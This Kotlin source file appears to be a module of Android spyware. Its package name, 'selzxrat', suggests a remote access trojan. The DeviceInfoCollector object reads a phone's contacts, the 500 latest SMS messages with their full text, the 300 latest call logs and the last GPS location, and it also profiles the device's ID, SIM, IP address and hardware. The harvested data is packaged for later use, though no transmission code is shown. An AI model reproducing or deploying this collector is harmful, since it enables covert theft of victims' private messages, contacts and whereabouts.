package com.selzxrat.v5

import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File

object DeviceInfoCollector {
    private const val TAG = "DeviceInfoCollector"

    data class BasicDeviceInfo(
        val deviceId: String,
        val deviceName: String,
        val deviceModel: String,
        val androidVersion: String,
        val manufacturer: String,
        val ipAddress: String,
        val country: String,
        val batteryLevel: Int,
        val isCharging: Boolean,
        val ramTotal: Long,
        val ramAvailable: Long,
        val storageTotal: Long,
        val storageAvailable: Long,
        val installedApps: Int,
        val simInfo: String
    )

    fun collectBasicInfo(context: Context): BasicDeviceInfo {
        val deviceId = android.provider.Settings.Secure.getString(
            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val simInfo = if (tm != null) {
            try {
                "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
            } catch (e: Exception) { "N/A" }
        } else "N/A"

        val ram = Runtime.getRuntime()
        val stat = StatFs(Environment.getDataDirectory().absolutePath)

        return BasicDeviceInfo(
            deviceId = deviceId,
            deviceName = android.os.Build.MODEL,
            deviceModel = android.os.Build.MODEL,
            androidVersion = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
            manufacturer = Build.MANUFACTURER,
            ipAddress = getIPAddress(),
            country = simInfo.split("|").getOrElse(1) { "N/A" }.trim(),
            batteryLevel = getBatteryLevel(context),
            isCharging = getChargingStatus(context),
            ramTotal = ram.totalMemory(),
            ramAvailable = ram.freeMemory(),
            storageTotal = stat.blockCountLong * stat.blockSizeLong,
            storageAvailable = stat.availableBlocksLong * stat.blockSizeLong,
            installedApps = context.packageManager.getInstalledApplications(0).size,
            simInfo = simInfo
        )
    }

    fun collectContacts(context: Context): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
                    contacts.add(mapOf("name" to (name ?: ""), "number" to (number ?: ""), "type" to (type ?: "")))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Contact collection failed: ${e.message}")
        }
        return contacts
    }

    fun collectSMS(context: Context): List<Map<String, String>> {
        val smsList = mutableListOf<Map<String, String>>()
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI, null, null, null,
                "${Telephony.Sms.DATE} DESC LIMIT 500"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    val date = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val type = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    smsList.add(mapOf(
                        "address" to (address ?: ""),
                        "body" to (body ?: ""),
                        "date" to (date ?: ""),
                        "type" to when (type) { "1" -> "inbox"; "2" -> "sent"; else -> "unknown" }
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS collection failed: ${e.message}")
        }
        return smsList
    }

    fun collectCallLogs(context: Context): List<Map<String, String>> {
        val logs = mutableListOf<Map<String, String>>()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 300"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                    val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    logs.add(mapOf(
                        "number" to (number ?: ""),
                        "name" to (name ?: "Unknown"),
                        "duration" to (duration ?: "0"),
                        "type" to when (type) {
                            "1" -> "incoming"
                            "2" -> "outgoing"
                            "3" -> "missed"
                            else -> "unknown"
                        },
                        "date" to (date ?: "")
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call log collection failed: ${e.message}")
        }
        return logs
    }

    fun collectLocation(context: Context): Map<String, Any> {
        val locMap = mutableMapOf<String, Any>()
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val hasGPS = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
            val hasNetwork = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            locMap["gpsEnabled"] = hasGPS
            locMap["networkEnabled"] = hasNetwork

            var location: Location? = null
            if (hasGPS) {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            }
            if (location == null && hasNetwork) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
            if (location != null) {
                locMap["latitude"] = location.latitude
                locMap["longitude"] = location.longitude
                locMap["accuracy"] = location.accuracy
                locMap["altitude"] = location.altitude
                locMap["provider"] = location.provider ?: ""
                locMap["gmaps_url"] = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
            } else {
                locMap["error"] = "No location available"
            }
        } catch (e: Exception) {
            locMap["error"] = e.message ?: "Location collection failed"
        }
        return locMap
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (e: Exception) {}
        return ""
    }

    private fun getBatteryLevel(context: Context): Int {
        val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100) / scale else -1
    }

    private fun getChargingStatus(context: Context): Boolean {
        val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
               status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }
}